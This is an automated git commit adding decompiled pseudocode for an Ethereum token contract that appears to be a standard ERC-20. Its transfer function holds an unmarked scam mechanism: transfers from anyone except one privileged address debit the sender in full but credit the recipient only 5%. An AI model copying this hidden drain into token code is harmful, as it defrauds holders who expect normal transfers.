3a266473ce2d70948e0a24db357b3e5e2f21b4c3
bot <abagoforgans@users.noreply.github.com>
2022-07-28 07:30:35 +0000

    autocommit

---
+++ contracts/0x955779B9E77330412447Cdd263Fd83ea8A421d64.sol
@@ -0,0 +1,128 @@
+contract main {
+
+
+
+
+// =====================  Runtime code  =====================
+
+
+array of uint256 name;
+array of uint256 symbol;
+uint8 decimals;
+uint256 _totalSupply;
+mapping of uint256 balanceOf;
+mapping of uint256 allowance;
+address stor6;
+
+function name() payable {
+    return name[0 len name.length]
+}
+
+function decimals() payable {
+    return decimals
+}
+
+function _totalSupply() payable {
+    return _totalSupply
+}
+
+function balanceOf(address arg1) payable {
+    require calldata.size - 4 >= 32
+    return balanceOf[address(arg1)]
+}
+
+function symbol() payable {
+    return symbol[0 len symbol.length]
+}
+
+function allowance(address arg1, address arg2) payable {
+    require calldata.size - 4 >= 64
+    return allowance[address(arg1)][address(arg2)]
+}
+
+function _fallback() payable {
+    revert
+}
+
+function totalSupply() payable {
+    return (_totalSupply - balanceOf[0])
+}
+
+function safeSub(uint256 arg1, uint256 arg2) payable {
+    require calldata.size - 4 >= 64
+    require arg2 <= arg1
+    return (arg1 - arg2)
+}
+
+function safeAdd(uint256 arg1, uint256 arg2) payable {
+    require calldata.size - 4 >= 64
+    require arg2 + arg1 >= arg1
+    return (arg2 + arg1)
+}
+
+function safeDiv(uint256 arg1, uint256 arg2) payable {
+    require calldata.size - 4 >= 64
+    require arg2 > 0
+    require arg2
+    return (arg1 / arg2)
+}
+
+function safeMul(uint256 arg1, uint256 arg2) payable {
+    require calldata.size - 4 >= 64
+    if arg1:
+        require arg1
+        require arg2 * arg1 / arg1 == arg2
+    return (arg2 * arg1)
+}
+
+function approve(address arg1, uint256 arg2) payable {
+    require calldata.size - 4 >= 64
+    allowance[msg.sender][address(arg1)] = arg2
+    emit Approval(arg2, msg.sender, arg1);
+    return 1
+}
+
+function transferFrom(address arg1, address arg2, uint256 arg3) payable {
+    require calldata.size - 4 >= 96
+    require arg3 <= balanceOf[address(arg1)]
+    balanceOf[address(arg1)] -= arg3
+    require arg3 <= allowance[address(arg1)][msg.sender]
+    allowance[address(arg1)][msg.sender] -= arg3
+    require arg3 + balanceOf[address(arg2)] >= balanceOf[address(arg2)]
+    balanceOf[address(arg2)] += arg3
+    emit Transfer(arg3, arg1, arg2);
+    return 1
+}
+
+function transfer(address arg1, uint256 arg2) payable {
+    require calldata.size - 4 >= 64
+    if not msg.sender:
+        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
+                    32,
+                    37,
+                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
+                    mem[201 len 27]
+    if not arg1:
+        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
+                    32,
+                    35,
+                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
+                    mem[199 len 29]
+    if balanceOf[address(msg.sender)] < arg2:
+        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
+                    32,
+                    38,
+                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
+                    mem[202 len 26]
+    balanceOf[address(msg.sender)] -= arg2
+    if stor6 != msg.sender:
+        balanceOf[arg1] += 5 * arg2 / 100
+    else:
+        balanceOf[arg1] += arg2
+    emit Transfer(arg2, msg.sender, arg1);
+    return 1
+}
+
+
+
+}
